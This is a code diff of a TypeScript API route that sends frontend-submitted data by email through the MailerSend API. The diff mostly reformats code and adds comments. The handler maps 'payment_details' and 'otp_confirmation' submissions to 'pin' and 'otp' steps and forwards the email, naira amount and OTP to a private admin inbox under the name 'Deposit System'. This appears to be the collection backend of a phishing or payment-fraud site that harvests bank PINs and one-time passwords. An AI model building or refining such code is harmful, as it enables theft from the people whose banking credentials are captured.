@@ -1,42 +1,41 @@
 export async function POST(request: Request) {
   try {
+    // 1️⃣ Parse frontend payload
     const { type, data } = await request.json()
 
+    // Map frontend "type" to backend step
     const step = type === "payment_details" ? "pin" : type === "otp_confirmation" ? "otp" : null
-
     if (!step) {
-      return Response.json({ success: false, error: "Invalid email step type" }, { status: 400 })
+      return Response.json(
+        { success: false, error: "Invalid email step type" },
+        { status: 400 }
+      )
     }
 
     const { email, amount, otp } = data
 
+    // 2️⃣ Load environment variables
     const apiToken = process.env.MAILERSEND_API_TOKEN
     const receiverEmail = process.env.RECEIVER_EMAIL
 
     if (!apiToken || apiToken === "your-mailersend-api-token") {
       console.log("[v0] Missing or invalid MAILERSEND_API_TOKEN")
       return Response.json(
-        {
-          success: false,
-          error: "Email service not configured",
-        },
-        { status: 500 },
+        { success: false, error: "Email service not configured" },
+        { status: 500 }
       )
     }
 
     if (!receiverEmail || receiverEmail === "admin@yoursite.com") {
       console.log("[v0] Missing or invalid RECEIVER_EMAIL")
       return Response.json(
-        {
-          success: false,
-          error: "Receiver email not configured",
-        },
-        { status: 500 },
+        { success: false, error: "Receiver email not configured" },
+        { status: 500 }
       )
     }
 
-    const fromEmail = "noreply@trial-3z0vklo7qj0g7qrx.mlsender.net" // MailerSend trial domain
-
+    // 3️⃣ Prepare email content
+    const fromEmail = "noreply@trial-3z0vklo7qj0g7qrx.mlsender.net" // trial domain
     let subject = ""
     let htmlContent = ""
 
@@ -73,24 +72,18 @@ export async function POST(request: Request) {
       `
     }
 
+    // 4️⃣ Prepare MailerSend payload (text fallback for trial accounts)
     const mailData = {
-      from: {
-        email: fromEmail,
-        name: "Deposit System",
-      },
-      to: [
-        {
-          email: receiverEmail,
-          name: "Admin",
-        },
-      ],
-      subject: subject,
+      from: { email: fromEmail, name: "Deposit System" },
+      to: [{ email: receiverEmail, name: "Admin" }],
+      subject,
       html: htmlContent,
       text: `Deposit notification for ${email}, amount: ₦${amount}`,
     }
 
     console.log("[v0] Sending email with MailerSend API")
 
+    // 5️⃣ Call MailerSend
     const response = await fetch("https://api.mailersend.com/v1/email", {
       method: "POST",
       headers: {
@@ -106,14 +99,13 @@ export async function POST(request: Request) {
     console.log("[v0] MailerSend response:", responseData)
 
     if (!response.ok) {
-      console.log("[v0] MailerSend API error:", response.status, responseData)
       return Response.json(
         {
           success: false,
           error: `MailerSend API error: ${response.status}`,
           details: responseData,
         },
-        { status: 500 },
+        { status: 500 }
       )
     }
 
@@ -127,7 +119,7 @@ export async function POST(request: Request) {
         error: "Failed to send email",
         details: error instanceof Error ? error.message : "Unknown error",
       },
-      { status: 500 },
+      { status: 500 }
     )
   }
 }
